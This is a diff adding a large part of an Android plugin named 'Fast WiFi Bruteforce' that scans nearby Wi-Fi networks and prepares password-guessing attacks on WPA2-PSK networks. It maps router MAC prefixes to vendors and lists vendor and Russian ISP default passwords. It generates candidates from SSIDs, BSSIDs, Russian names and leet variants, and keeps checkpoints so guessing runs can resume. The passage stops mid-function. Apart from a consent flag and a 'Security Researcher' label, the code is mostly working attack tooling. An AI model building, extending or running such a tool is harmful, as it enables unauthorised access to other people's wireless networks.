@@ -1,0 +1,3541 @@
+__id__ = "fast_wifi_bruteforce"
+__name__ = "Fast WiFi Bruteforce"
+__version__ = "10.5.0"
+__author__ = "Security Researcher"
+__description__ = "Сканирование Wi-Fi и проверка WPA2-PSK"
+__icon__ = "rounded:wifi_password"
+__permissions__ = ["files", "shizuku"]
+
+import os
+import io
+import re
+import json
+import time
+import hashlib
+import threading
+from collections import deque
+
+
+class FastWiFiBruteforce(BasePlugin):
+    MAX_FILE = 10_000_000
+    MAX_LOGS = 300
+    MAX_RESULTS = 100
+    MAX_DICTS = 16
+    MAX_PASSWORDS = 200_000
+    MAX_RECENT = 8
+    MAX_RSSI_SAMPLES = 300
+    STATE_KEY = "state_v935"
+    CHECKPOINT_KEY = "checkpoint_v1"
+    FOUND_KEY = "found_v1"
+
+    DEFAULT_SETTLE = 4.0
+    MIN_SETTLE = 3.0
+    MAX_SETTLE = 12.0
+    FAST_SETTLE = 1.5
+    INTER_ATTEMPT_DELAY = 0.5
+    SETTLE_MIN_SAMPLES = 8
+
+    UI_THROTTLE_MS = 500
+    LOG_EVERY_N = 10
+    CHECKPOINT_EVERY = 50
+    RSSI_SAMPLE_INTERVAL = 2.5
+
+    SECURITY_NAMES = {
+        "psk": "WPA2-Personal",
+        "sae": "WPA3-Personal",
+        "eap": "Enterprise",
+        "open": "Открытая сеть",
+        "other": "Другой тип защиты",
+        "unknown": "Защита не определена",
+        "wep": "WEP",
+    }
+
+    SECURITY_EMOJI = {
+        "psk": "🔒",
+        "sae": "🔐",
+        "eap": "🏢",
+        "open": "🌐",
+        "other": "❓",
+        "unknown": "❔",
+        "wep": "🔓",
+    }
+
+    SCAN_PREFIX = re.compile(
+        r"^\s*"
+        r"(?P<bssid>(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})"
+        r"\s+(?P<frequency>\d+)"
+        r"\s+(?P<rssi>-?\d+)"
+        r"(?:\s*\([^)]*\))?"
+        r"\s+(?P<age>\S+)"
+        r"[ \t](?P<tail>.*)$"
+    )
+    FLAGS_SUFFIX = re.compile(r"(?P<flags>(?:\[[^\]\r\n]*\])+)\s*$")
+    MAC_PREFIX = re.compile(r"^\s*(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}\b")
+
+    SHELL_HARD_ERROR = re.compile(
+        r"(?im)^\s*(?:"
+        r"unknown command\b|"
+        r"unknown option\b|"
+        r"command not found\b|"
+        r"permission denied\b"
+        r")"
+    )
+
+    # OUI-префиксы вендоров СНГ и глобальных (актуальны для сетей РФ)
+    OUI_VENDORS = {
+        "Eltex": ["CC9DA2", "E0D9E3", "E45AD4", "E828C1", "9054B7",
+                  "A8F94B", "6813E2", "ECB1E0"],
+        "Sagemcom": ["38A659", "3453D2", "7C2664", "B0B2DC", "CC33BB",
+                     "D08A55", "D0542D", "D432A8", "F4CA24", "F89E28",
+                     "4C17EB", "4065A3", "348AAE", "18622C"],
+        "ZTE": ["20F307", "981333", "0C44C0", "F01B24", "A0092E",
+                "B08B92", "C094AD", "384608", "20F83B"],
+        "Xiaomi": ["5C0214", "7811DC", "640980", "F0B429", "8CBEBE",
+                   "50642B", "04CF8C", "28D127", "3CCD57", "64CC2E"],
+        "TP-Link": ["14CC20", "30B5C2", "50C7BF", "60E327", "A42BB0",
+                    "C46E1F", "EC086B", "F4EC38", "9C5322", "B04E26"],
+        "Huawei": ["00E0FC", "283CE4", "70723C", "A0F479", "D07AB5",
+                   "E0247F", "F4559C", "8853D4"],
+        "Keenetic": ["50FF20", "9C2611", "5C1BFB"],
+        "Asus": ["04D4C4", "10BF48", "2C56DC", "50465D", "AC220B",
+                 "D850E6", "F832E4", "1CB72C", "38D547"],
+        "D-Link": ["14D64D", "1C7EE5", "28107B", "340804", "74DA88",
+                   "B8A386", "C8BE19", "F07D68", "A0AB1B"],
+        "Netgear": ["204E7F", "28C68E", "2C3033", "4494FC", "A00460",
+                    "B03956", "C03F0E", "E0469A", "9C3DCF"],
+        "Zyxel": ["001349", "5CF4AB", "90EF68", "B0B2DC", "F87B20"],
+        "Tenda": ["00B00C", "081078", "C83A35", "D83214", "502B73"],
+        "MikroTik": ["18FD74", "488F5A", "64D154", "6C3B6B", "744D28",
+                     "CC2DE0", "DC2C6E", "E48D8C"],
+        "Ubiquiti": ["0418D6", "18E829", "24A43C", "44D9E7", "687251",
+                     "788A20", "802AA8", "B4FBE4", "FCECDA"],
+        "Mercusys": ["9C5322", "A842A1"],
+        "Totolink": ["900A3A", "B0487A", "F88C21"],
+        "TRENDnet": ["0014D1", "C05627"],
+        "Linksys": ["149182", "48F8B3", "58EF68", "94103E", "C05627"],
+    }
+
+    # Провайдерские дефолты (имена для подключения и web-интерфейс)
+    VENDOR_DEFAULTS = {
+        "Eltex": ["admin123", "eltex123", "12345678", "Eltex123",
+                  "eltex", "admin1234"],
+        "Sagemcom": ["admin123", "sagemcom123", "admin1234", "12345678",
+                     "Sagemcom1", "sagemcom"],
+        "ZTE": ["admin123", "zte123", "admin1234", "zte12345",
+                "admintelecom", "Zte1234"],
+        "Xiaomi": ["admin123", "xiaomi123", "12345678", "Xiaomi123",
+                   "miwifi123", "xiaomi1234"],
+        "TP-Link": ["admin123", "tplink123", "admin1234", "tplink1234",
+                    "tplinkadmin", "Tplink123"],
+        "Huawei": ["admin123", "huawei123", "admin1234", "Huawei123",
+                   "telecomadmin", "admintelecom"],
+        "Keenetic": ["keenetic", "admin123", "12345678", "Keenetic",
+                     "keenetic123"],
+        "Asus": ["admin123", "asus123", "admin1234", "Asus1234",
+                 "Asus123", "asusadmin"],
+        "D-Link": ["admin123", "password", "dlink123", "Dlink123",
+                   "admin1234", "d-link"],
+        "Netgear": ["password", "netgear123", "admin123", "Netgear1",
+                    "netgear1"],
+        "Zyxel": ["admin123", "zyxel123", "12345678", "Zyxel123"],
+        "Tenda": ["tenda123", "admin123", "12345678", "Tenda123"],
+        "MikroTik": ["admin123", "mikrotik", "12345678", "MikroTik1"],
+        "Ubiquiti": ["ubnt1234", "admin123", "ubiquiti", "ubnt123",
+                     "ubntubnt"],
+        "Mercusys": ["admin123", "mercusys", "12345678", "Mercusys1"],
+        "Totolink": ["admin123", "totolink", "12345678", "Totolink1"],
+        "TRENDnet": ["admin123", "trendnet", "12345678", "TRENDnet1"],
+        "Linksys": ["admin123", "linksys123", "12345678", "Linksys123"],
+        # Провайдерские наборы
+        "Rostelecom": ["admin", "admin123", "rt", "rt123", "rostelecom"],
+        "MGTS": ["admin", "mgts", "mtsoao", "admin123", "admintelecom"],
+        "Beeline": ["beeline30", "admin", "beeline", "beeline123"],
+        "MTS": ["admin", "mts", "adminmts1", "admin123", "mts123"],
+        "ByFly": ["admin", "byfly", "byfly123", "12345678"],
+        "Promsvyaz": ["admin", "promsvyaz", "telecomadmin", "admintelecom"],
+        "Kazakhtelecom": ["admin", "1q2w3e4r", "123456", "admin123"],
+    }
+
+    # Русские имена — кириллица + транслитерация (для генератора)
+    RU_NAMES_LATIN = [
+        "sasha", "sanya", "sashka", "sashok", "shura", "alex", "aleks",
+        "aleksandr", "sasha", "masha", "mariya", "misha", "mihail",
+        "dima", "dmitriy", "vova", "vladimir", "kolya", "nikolay",
+        "katya", "ekaterina", "anya", "anna", "nastya", "anastasiya",
+        "lena", "elena", "tanya", "tatyana", "olya", "olga", "vanya",
+        "ivan", "petya", "petr", "yura", "yuriy", "borya", "boris",
+        "andrey", "andrei", "maxim", "maksim", "nikita", "sergey",
+        "sergei", "artem", "artem", "denis", "egor", "yegor", "ilya",
+        "kirill", "leonid", "roman", "roma", "ruslan", "stanislav",
+        "stas", "stepan", "vadim", "valentin", "valera", "viktor",
+        "vitya", "yana", "alena", "alyona", "daria", "dasha",
+        "galina", "galya", "ksenia", "ksyusha", "larisa", "lera",
+        "lida", "luda", "lyubov", "lyuba", "marina", "nadezhda",
+        "nadya", "nina", "oksana", "polina", "polya", "sofia",
+        "sonya", "vera", "sveta", "svetlana",
+    ]
+    RU_NAMES_CYRILLIC = [
+        "саша", "саня", "маша", "миша", "дима", "вова", "коля",
+        "катя", "аня", "настя", "лена", "таня", "оля", "ваня",
+        "петя", "юра", "боря", "андрей", "максим", "никита",
+        "сергей", "артём", "денис", "егор", "илья", "кирилл",
+        "роман", "руслан", "стас", "степан", "вадим", "валера",
+        "виктор", "витя", "яна", "алёна", "даша", "галина",
+        "галя", "ксения", "лариса", "лера", "лида", "люба",
+        "любовь", "марина", "надежда", "надя", "нина", "оксана",
+        "полина", "соня", "вера", "света", "светлана",
+    ]
+
+    # Русские слова-пароли (кириллица, топ из утечек 2024-2025)
+    RU_WORDS = [
+        "йцукен", "пароль", "рандеву", "привет", "любовь", "люблю",
+        "наташа", "максим", "марина", "андрей", "кристина", "никита",
+        "маша", "саша", "аня", "катя", "дима", "миша", "коля", "вова",
+        "солнышко", "зайка", "котик", "пупсик", "любимый", "любимая",
+        "радость", "счастье", "удача", "мечта", "надежда", "вера",
+    ]
+
+    # leet-подстановки для морфинга
+    LEET_MAP = {
+        "a": ["a", "4", "@"],
+        "e": ["e", "3"],
+        "i": ["i", "1", "!"],
+        "o": ["o", "0"],
+        "s": ["s", "5", "$"],
+        "t": ["t", "7"],
+        "l": ["l", "1"],
+        "g": ["g", "9"],
+        "b": ["b", "8"],
+    }
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+
+        self._ready = False
+        self._init_error = ""
+        self._thread = None
+        self._stop = threading.Event()
+        self._shell_lock = threading.Lock()
+        self._log_lock = threading.RLock()
+        self._rssi_lock = threading.Lock()
+
+        self._busy = False
+        self._running = False
+        self._scanning = False
+
+        self._page = "main"
+        self._logs = []
+
+        self._shell_mode = "unknown"
+        self._uid = ""
+        self._cmd_ok = False
+        self._shell_checked_with_api = False
+
+        self._network = {}
+        self._networks = []
+        self._scan_raw = ""
+        self._scan_time = ""
+        self._scan_attempted = False
+        self._scan_unparsed = 0
+        self._show_raw = False
+        self._network_filter = ""
+
+        self._dicts = {}
+        self._enabled_dicts = []
+        self._folder = "/sdcard/Download"
+        self._files = []
+        self._results = []
+        self._query = ""
+        self._depth = 4
+
+        self._consent = False
+        self._settle = self.DEFAULT_SETTLE
+        self._checked = 0
+        self._total = 0
+        self._speed = 0.0
+        self._eta = 0.0
+        self._found_password = ""
+        self._reveal = False
+        self._outcome = "Готов к работе"
+
+        self._finished = False
+        self._last_connect_reply = ""
+        self._recent = []
+        self._recent_lock = threading.Lock()
+        self._password_pool = []
+
+        self._manual_password = ""
+        self._manual_result = ""
+        self._manual_busy = False
+
+        self._refresh_warning = False
+        self._copy_flash = 0
+        self._last_ui_refresh = 0.0
+        self._ui_lock = threading.Lock()
+
+        # Checkpoint / resume
+        self._resume_from = 0
+        self._resume_enabled = True
+        self._pending_resume_total = 0
+
+        # Генерация
+        self._use_ssid_gen = False
+        self._use_vendor_gen = False
+        self._use_ru_gen = False
+        self._use_morph = False
+
+        # Adaptive
+        self._use_adaptive_settle = False
+        self._settle_samples = deque(maxlen=30)
+
+        # Notify
+        self._notify_on_found = True
+
+        # RSSI
+        self._rssi_samples = []
+        self._rssi_target_bssid = ""
+        self._rssi_thread = None
+        self._rssi_stop = None
+
+        # Целевой security
+        self._target_sec = "wpa2"
+
+    # ═══════════════════════════════════════════════
+    # УТИЛИТЫ
+    # ═══════════════════════════════════════════════
+
+    @staticmethod
+    def _text(value):
+        if value is None:
+            return ""
+        if isinstance(value, bytes):
+            return value.decode("utf-8", errors="replace")
+        if isinstance(value, (list, tuple)):
+            return "\n".join(FastWiFiBruteforce._text(x) for x in value)
+        return str(value)
+
+    @staticmethod
+    def _shq(value):
+        value = str(value)
+        if "\x00" in value:
+            raise ValueError("NUL недопустим в shell-аргументе")
+        return "'" + value.replace("'", "'\\''") + "'"
+
+    @staticmethod
+    def _path(value):
+        path = os.path.normpath(str(value or "/sdcard"))
+        if path != "/sdcard" and not path.startswith("/sdcard/"):
+            raise ValueError("Разрешены только пути внутри /sdcard")
+        if any(c in path for c in ("\x00", "\r", "\n")):
+            raise ValueError("Недопустимое имя файла")
+        return path
+
+    @staticmethod
+    def _bool(value):
+        if isinstance(value, str):
+            return value.lower() in ("true", "1", "yes", "on")
+        return bool(value)
+
+    @staticmethod
+    def _valid_password(value):
+        if any(c in value for c in ("\x00", "\r", "\n")):
+            return False
+        try:
+            size = len(value.encode("utf-8"))
+        except UnicodeError:
+            return False
+        if 8 <= len(value) and 8 <= size <= 63:
+            return True
+        return len(value) == 64 and re.fullmatch(
+            r"[0-9a-fA-F]{64}", value) is not None
+
+    @staticmethod
+    def _valid_wep(value):
+        if any(c in value for c in ("\x00", "\r", "\n")):
+            return False
+        v = str(value)
+        if not re.fullmatch(r"[0-9a-fA-F]+", v):
+            return False
+        return len(v) in (10, 26, 32)
+
+    @staticmethod
+    def _format_eta(seconds):
+        try:
+            seconds = int(max(0, round(float(seconds))))
+        except (TypeError, ValueError):
+            return "—"
+        if seconds <= 0:
+            return "—"
+        if seconds < 60:
+            return "{} с".format(seconds)
+        if seconds < 3600:
+            return "{} мин {} с".format(seconds // 60, seconds % 60)
+        return "{} ч {} мин".format(seconds // 3600, (seconds % 3600) // 60)
+
+    @staticmethod
+    def _mask_last4(password):
+        try:
+            p = str(password)
+            if len(p) <= 4:
+                return "…" + p
+            return "…" + p[-4:]
+        except Exception:
+            return "…"
+
+    @staticmethod
+    def _call_or_prop(obj, name):
+        try:
+            value = getattr(obj, name)
+        except Exception:
+            return None
+        if callable(value):
+            try:
+                return value()
+            except Exception:
+                return None
+        return value
+
+    @staticmethod
+    def _oui_of(bssid):
+        try:
+            parts = str(bssid).lower().split(":")
+            if len(parts) >= 3:
+                return "".join(p.upper() for p in parts[:3])
+        except Exception:
+            pass
+        return ""
+
+    @staticmethod
+    def _is_ascii(s):
+        try:
+            s.encode("ascii")
+            return True
+        except Exception:
+            return False
+
+    def _vendor_for_bssid(self, bssid):
+        try:
+            oui = self._oui_of(bssid)
+            if not oui:
+                return ""
+            for vendor, ouis in self.OUI_VENDORS.items():
+                if oui in ouis:
+                    return vendor
+        except Exception:
+            pass
+        return ""
+
+    def _vendor_defaults_for_bssid(self, bssid):
+        out = []
+        seen = set()
+
+        def add(p):
+            p = str(p)
+            if p in seen:
+                return
+            if not self._valid_password(p):
+                return
+            seen.add(p)
+            out.append(p)
+
+        vendor = self._vendor_for_bssid(bssid)
+        if vendor:
+            for pw in self.VENDOR_DEFAULTS.get(vendor, []):
+                add(pw)
+            self._log("info", "Вендор по OUI: " + vendor)
+
+        clean = str(bssid).replace(":", "").replace("-", "").lower()
+        if len(clean) >= 8:
+            last8 = clean[-8:]
+            add(last8)
+            add(last8.upper())
+            add("admin" + last8[:5])
+            add(last8[:6] + "123")
+        if len(clean) >= 6:
+            add(clean[-6:] + "1234")
+
+        for pw in ["12345678", "password", "admin123", "1234567890",
+                   "qwerty123", "87654321", "admin1234", "admin12345"]:
+            add(pw)
+
+        return out
+
+    def _generate_morphs(self, word):
+        """Генерирует leet-морфы слова. Ограничено 200 вариантами."""
+        if not word or len(word) < 4:
+            return []
+        out = set()
+
+        # базовая
+        out.add(word)
+        out.add(word.lower())
+        out.add(word.upper())
+        out.add(word.capitalize())
+
+        # одиночные подстановки
+        low = word.lower()
+        for i, ch in enumerate(low):
+            if ch in self.LEET_MAP:
+                for sub in self.LEET_MAP[ch]:
+                    if sub == ch:
+                        continue
+                    out.add(low[:i] + sub + low[i+1:])
+
+        # полная leet-подстановка
+        full = []
+        for ch in low:
+            if ch in self.LEET_MAP and len(self.LEET_MAP[ch]) > 1:
+                full.append(self.LEET_MAP[ch][1])
+            else:
+                full.append(ch)
+        out.add("".join(full))
+
+        # цифры в конце
+        for suf in ["123", "1234", "12345", "123456", "1", "12",
+                    "2020", "2021", "2022", "2023", "2024", "2025"]:
+            out.add(word + suf)
+            out.add(low + suf)
+            out.add(low.capitalize() + suf)
+
+        # с символами
+        for sym in ["!", "@", "#", "$"]:
+            out.add(word + sym)
+            out.add(low + sym)
+
+        # ограничение
+        result = []
+        seen = set()
+        for w in out:
+            if w in seen:
+                continue
+            if not (8 <= len(w) <= 63):
+                continue
+            seen.add(w)
+            result.append(w)
+            if len(result) >= 200:
+                break
+        return result
+
+    @staticmethod
+    def _generate_from_ssid(ssid):
+        if not ssid:
+            return []
+        out = []
+        seen = set()
+
+        def add(p):
+            p = str(p)
+            if p in seen:
+                return
+            if not (8 <= len(p) <= 63):
+                return
+            seen.add(p)
+            out.append(p)
+
+        clean = str(ssid).strip()
+        lower = clean.lower()
+        upper = clean.upper()
+
+        parts = [p for p in re.split(r"[\s_\-\.]+", clean) if p]
+        digits = re.findall(r"\d+", clean)
+
+        suffixes = ["123", "1234", "12345", "123456", "12345678",
+                    "2020", "2021", "2022", "2023", "2024", "2025", "2026",
+                    "!", "@123", "#123", "321", "111", "000", "007",
+                    "777", "999", "555", "88", "66", "11", "01",
+                    "wifi", "WiFi", "admin", "home", "net", "internet"]
+
+        for s in (clean, lower, upper):
+            for suf in suffixes:
+                add(s + suf)
+            for y in range(1990, 2031):
+                add(s + str(y))
+            add(s + "!")
+            add(s + "@")
+            add(s + "*")
+            add("!" + s)
+            add(s + s)
+
+        for part in parts:
+            add(part)
+            add(part.lower())
+            for suf in suffixes[:15]:
+                add(part + suf)
+            for y in [2020, 2021, 2022, 2023, 2024, 2025, 2026]:
+                add(part + str(y))
+
+        if len(parts) >= 2:
+            for i, p1 in enumerate(parts):
+                for j, p2 in enumerate(parts):
+                    if i == j:
+                        continue
+                    add(p1 + p2)
+                    add(p1 + p2 + "123")
+                    add(p1.lower() + p2.lower())
+                    add(p1.lower() + "_" + p2.lower())
+
+        for pre in ["admin", "root", "user", "test", "pass", "wifi",
+                    "home", "net", "internet", "modem", "router"]:
+            add(pre + clean)
+            add(pre + lower)
+            add(pre + "_" + clean)
+
+        for d in digits:
+            for suf in ["", "123", "0", "00", "1", "12"]:
+                add(d + suf)
+                add("pass" + d + suf)
+                add("admin" + d + suf)
+                add("wifi" + d + suf)
+
+        for d in ["12345678", "123456789", "1234567890", "password",
+                  "admin123", "qwerty123", "11111111", "00000000"]:
+            add(d)
+
+        return out[:500]
+
+    def _generate_ru_candidates(self, ssid):
+        """Генерация по русским паттернам + имена + морфы."""
+        out = []
+        seen = set()
+
+        def add(p):
+            p = str(p)
+            if p in seen:
+                return
+            if not (8 <= len(p) <= 63):
+                return
+            seen.add(p)
+            out.append(p)
+
+        # базовые русские пароли
+        for w in self.RU_WORDS:
+            try:
+                size = len(w.encode("utf-8"))
+            except Exception:
+                continue
+            if size >= 8:
+                add(w)
+            add(w + "123")
+            add(w + "2024")
+            add(w + "2025")
+
+        # транслит имён
+        years = [str(y) for y in range(1980, 2026)]
+        suffixes = ["123", "1234", "!", "1", "007", "2010", "2015"]
+
+        for name in self.RU_NAMES_LATIN:
+            add(name)
+            for y in [1980, 1985, 1990, 1995, 2000, 2005, 2010, 2015,
+                      2020]:
+                add(name + str(y))
+            for suf in suffixes[:4]:
+                add(name + suf)
+            add(name.capitalize())
+            add(name.capitalize() + "123")
+
+        for name in self.RU_NAMES_CYRILLIC:
+            try:
+                size = len(name.encode("utf-8"))
+            except Exception:
+                continue
+            if size >= 8:
+                add(name)
+            add(name + "123")
+            add(name + "2020")
+
+        # морфы (только для коротких — чтобы не раздувать)
+        if self._use_morph:
+            extra_words = ["password", "admin", "welcome", "qwerty",
+                           "love", "hello", "wifi", "internet"]
+            for w in extra_words:
+                for m in self._generate_morphs(w):
+                    add(m)
+            for w in self.RU_WORDS[:10]:
+                for m in self._generate_morphs(w):
+                    add(m)
+
+        # специфика по SSID
+        if ssid:
+            low = str(ssid).lower().strip()
+            for y in [str(y) for y in range(1980, 2026)]:
+                add(low + y)
+                add(low + "_" + y)
+            for w in self.RU_WORDS[:20]:
+                if low.startswith(w) or w.startswith(low[:3]):
+                    add(w + "123")
+
+        return out[:800]
+
+    # ═══════════════════════════════════════════════
+    # ЛОГИ
+    # ═══════════════════════════════════════════════
+
+    def _log(self, level, message):
+        text = self._text(message).replace("\x00", "")[:700]
+        stamp = time.strftime("%H:%M:%S")
+        with self._log_lock:
+            self._logs.append((level, stamp, text))
+            self._logs = self._logs[-self.MAX_LOGS:]
+
+    def _toast(self, message):
+        try:
+            if self._ready:
+                self.toast(self._text(message))
+        except Exception:
+            pass
+
+    def _refresh(self, force=False):
+        if not self._ready:
+            return
+        try:
+            now = time.monotonic()
+            with self._ui_lock:
+                if not force:
+                    if (now - self._last_ui_refresh) < (self.UI_THROTTLE_MS / 1000.0):
+                        return
+                self._last_ui_refresh = now
+            self.refresh()
+        except Exception:
+            if not self._refresh_warning:
+                self._refresh_warning = True
+                self._log("warning",
+                          "Автообновление UI недоступно. Нажмите «Обновить».")
+
+    def _bind(self, callback, *bound_args):
+        def invoke(*args, **kwargs):
+            if not self._ready:
+                return None
+            try:
+                return callback(*bound_args)
+            except Exception as exc:
+                self._log("error", str(exc)[:240])
+                self._toast("Ошибка. Подробности в журнале.")
+            finally:
+                self._refresh(force=True)
+            return None
+        return invoke
+
+    def _value(self, callback, refresh=False):
+        def invoke(value=None, *args, **kwargs):
+            if not self._ready:
+                return None
+            try:
+                return callback(value)
+            except Exception as exc:
+                self._log("error", str(exc)[:240])
+            finally:
+                if refresh:
+                    self._refresh(force=True)
+            return None
+        return invoke
+
+    def _go(self, page):
+        self._page = page
+        self._last_ui_refresh = 0.0
+
+    def _save(self):
+        try:
+            self.set_setting(self.STATE_KEY, {
+                "network": dict(self._network),
+                "folder": self._folder,
+                "dicts": [{"path": p} for p in self._dicts],
+                "enabled": list(self._enabled_dicts),
+                "settle": self._settle,
+                "use_ssid_gen": bool(self._use_ssid_gen),
+                "use_vendor_gen": bool(self._use_vendor_gen),
+                "use_ru_gen": bool(self._use_ru_gen),
+                "use_morph": bool(self._use_morph),
+                "adaptive": bool(self._use_adaptive_settle),
+                "resume": bool(self._resume_enabled),
+                "notify": bool(self._notify_on_found),
+            })
+        except Exception as exc:
+            self._log("warning",
+                      "Не удалось сохранить настройки: " + str(exc)[:180])
+
+    # ═══════════════════════════════════════════════
+    # CHECKPOINT
+    # ═══════════════════════════════════════════════
+
+    def _dict_fingerprint(self):
+        try:
+            parts = sorted(self._enabled_dicts)
+            if self._use_ssid_gen:
+                parts.append("__gen_ssid__")
+            if self._use_vendor_gen:
+                parts.append("__gen_vendor__")
+            if self._use_ru_gen:
+                parts.append("__gen_ru__")
+            if self._use_morph:
+                parts.append("__gen_morph__")
+            joined = "|".join(parts)
+            return hashlib.sha256(joined.encode("utf-8")).hexdigest()[:16]
+        except Exception:
+            return ""
+
+    def _save_checkpoint(self):
+        if self._checked <= 0:
+            return
+        try:
+            self.set_setting(self.CHECKPOINT_KEY, {
+                "ssid": self._network.get("ssid", ""),
+                "bssid": self._network.get("bssid", ""),
+                "security": self._network.get("security", ""),
+                "checked": int(self._checked),
+                "total": int(self._total),
+                "dict_fp": self._dict_fingerprint(),
+                "ts": time.time(),
+            })
+        except Exception:
+            pass
+
+    def _load_checkpoint(self):
+        try:
+            data = self.get_setting(self.CHECKPOINT_KEY, {})
+            if isinstance(data, str):
+                try:
+                    data = json.loads(data)
+                except Exception:
+                    return {}
+            if not isinstance(data, dict):
+                return {}
+            return data
+        except Exception:
+            return {}
+
+    def _checkpoint_summary(self):
+        cp = self._load_checkpoint()
+        if not cp or not cp.get("ssid"):
+            return ""
+        ssid = cp.get("ssid", "")
+        checked = int(cp.get("checked", 0))
+        total = int(cp.get("total", 0))
+        ts = float(cp.get("ts", 0))
+        if ssid != self._network.get("ssid", ""):
+            return ""
+        if cp.get("dict_fp") != self._dict_fingerprint():
+            return ""
+        when = ""
+        try:
+            delta = max(0, time.time() - ts)
+            if delta < 60:
+                when = "{} с назад".format(int(delta))
+            elif delta < 3600:
+                when = "{} мин назад".format(int(delta // 60))
+            elif delta < 86400:
+                when = "{} ч назад".format(int(delta // 3600))
+            else:
+                when = "{} дн назад".format(int(delta // 86400))
+        except Exception:
+            pass
+        if total:
+            return "💾 {} · #{} из {} · {}".format(ssid, checked, total, when)
+        return "💾 {} · #{} · {}".format(ssid, checked, when)
+
+    def _clear_checkpoint(self):
+        try:
+            self.set_setting(self.CHECKPOINT_KEY, {})
+            self._resume_from = 0
+            self._pending_resume_total = 0
+        except Exception:
+            pass
+        self._toast("Чекпоинт сброшен")
+        self._log("info", "Чекпоинт сброшен пользователем")
+
+    # ═══════════════════════════════════════════════
+    # NOTIFY / VIBRATE
+    # ═══════════════════════════════════════════════
+
+    def _notify_found(self, ssid, password):
+        if not self._notify_on_found:
+            return
+        try:
+            android = self.api.getAndroid()
+            android.notifyShow(
+                "WiFi Audit: пароль найден",
+                "{} · {}".format(ssid, password))
+        except Exception as exc:
+            self._log("warning", "notify: " + str(exc)[:120])
+        try:
+            android = self.api.getAndroid()
+            android.vibratePattern([300, 100, 300, 100, 600])
+        except Exception:
+            pass
+
+    # ═══════════════════════════════════════════════
+    # RSSI
+    # ═══════════════════════════════════════════════
+
+    def _start_rssi_sampler(self):
+        if self._rssi_thread is not None and self._rssi_thread.is_alive():
+            return
+        self._rssi_stop = threading.Event()
+
+        def loop():
+            while not self._rssi_stop.wait(self.RSSI_SAMPLE_INTERVAL):
+                try:
+                    if not self._ready:
+                        continue
+                    if not self._network.get("bssid"):
+                        continue
+                    self._sample_rssi_once()
+                except Exception:
+                    pass
+
+        try:
+            self._rssi_thread = threading.Thread(target=loop, daemon=True)
+            self._rssi_thread.start()
+        except Exception:
+            self._rssi_thread = None
+
+    def _stop_rssi_sampler(self):
+        try:
+            if self._rssi_stop is not None:
+                self._rssi_stop.set()
+        except Exception:
+            pass
+        self._rssi_thread = None
+
+    def _sample_rssi_once(self):
+        bssid = self._network.get("bssid", "")
+        if not bssid:
+            return
+        rssi = None
+
+        if self._shell_mode in ("shizuku", "root"):
+            try:
+                got = self._shell_lock.acquire(timeout=0.1)
+                if not got:
+                    return
+                try:
+                    if self._shell_mode == "shizuku":
+                        raw = self.shizuku("cmd wifi list-scan-results")
+                    else:
+                        raw = self.root("cmd wifi list-scan-results")
+                finally:
+                    try:
+                        self._shell_lock.release()
+                    except Exception:
+                        pass
+                text = ""
+                if isinstance(raw, dict):
+                    for k in ("out", "stdout", "output"):
+                        if raw.get(k):
+                            text = str(raw[k])
+                            break
+                elif raw is not None:
+                    text = str(raw)
+                for line in text.splitlines():
+                    item = self._parse_scan_line(line)
+                    if item and item["bssid"] == bssid.lower():
+                        rssi = item["rssi"]
+                        break
+            except Exception:
+                pass
+
+        if rssi is None:
+            try:
+                dev = self.api.getDevice()
+                raw = dev.wifiScanResultsJson()
+                if isinstance(raw, bytes):
+                    raw = raw.decode("utf-8", errors="replace")
+                if isinstance(raw, str):
+                    try:
+                        data = json.loads(raw)
+                    except Exception:
+                        data = []
+                else:
+                    data = raw or []
+                if isinstance(data, list):
+                    for item in data:
+                        if not isinstance(item, dict):
+                            continue
+                        b = (item.get("BSSID")
+                             or item.get("bssid") or "").lower()
+                        if b == bssid.lower():
+                            try:
+                                rssi = int(item.get("level")
+                                           or item.get("RSSI")
+                                           or item.get("rssi") or -100)
+                            except Exception:
+                                rssi = -100
+                            break
+            except Exception:
+                pass
+
+        if rssi is not None:
+            now = time.time()
+            with self._rssi_lock:
+                self._rssi_samples.append((now, int(rssi)))
+                if len(self._rssi_samples) > self.MAX_RSSI_SAMPLES:
+                    del self._rssi_samples[:-self.MAX_RSSI_SAMPLES]
+
+    # ═══════════════════════════════════════════════
+    # LIFECYCLE
+    # ═══════════════════════════════════════════════
+
+    def on_plugin_load(self):
+        if self._init_error:
+            raise RuntimeError(self._init_error)
+        if self._thread is not None and self._thread.is_alive():
+            raise RuntimeError("Предыдущая операция ещё завершается")
+
+        self._self_test_parser()
+
+        self._stop.clear()
+        self._busy = False
+        self._running = False
+        self._scanning = False
+        self._consent = False
+        self._copy_flash = 0
+        self._finished = False
+        self._last_connect_reply = ""
+        with self._recent_lock:
+            self._recent = []
+        self._password_pool = []
+        self._manual_password = ""
+        self._manual_result = ""
+        self._manual_busy = False
+        self._shell_mode = "unknown"
+        self._uid = ""
+        self._shell_checked_with_api = False
+        self._settle_samples = deque(maxlen=30)
+        with self._rssi_lock:
+            self._rssi_samples = []
+
+        saved = self.get_setting(self.STATE_KEY, {})
+        if isinstance(saved, str):
+            try:
+                saved = json.loads(saved)
+            except Exception:
+                saved = {}
+        if not isinstance(saved, dict):
+            saved = {}
+
+        network = saved.get("network")
+        self._network = (
+            dict(network) if isinstance(network, dict)
+            and isinstance(network.get("ssid"), str) else {}
+        )
+        if self._network.get("ssid"):
+            try:
+                self._network["ssid"] = str(self._network["ssid"]).strip()
+            except Exception:
+                pass
+
+        try:
+            self._folder = self._path(saved.get("folder", "/sdcard/Download"))
+        except Exception:
+            self._folder = "/sdcard/Download"
+
+        try:
+            self._settle = max(self.MIN_SETTLE,
+                               min(self.MAX_SETTLE,
+                                   float(saved.get("settle",
+                                                   self.DEFAULT_SETTLE))))
+        except Exception:
+            self._settle = self.DEFAULT_SETTLE
+
+        self._use_ssid_gen = bool(saved.get("use_ssid_gen", False))
+        self._use_vendor_gen = bool(saved.get("use_vendor_gen", False))
+        self._use_ru_gen = bool(saved.get("use_ru_gen", False))
+        self._use_morph = bool(saved.get("use_morph", False))
+        self._use_adaptive_settle = bool(saved.get("adaptive", False))
+        self._resume_enabled = bool(saved.get("resume", True))
+        self._notify_on_found = bool(saved.get("notify", True))
+
+        self._dicts = {}
+        records = saved.get("dicts", [])
+        if isinstance(records, list):
+            for record in records[:self.MAX_DICTS]:
+                if not isinstance(record, dict) or not record.get("path"):
+                    continue
+                try:
+                    path = self._path(record["path"])
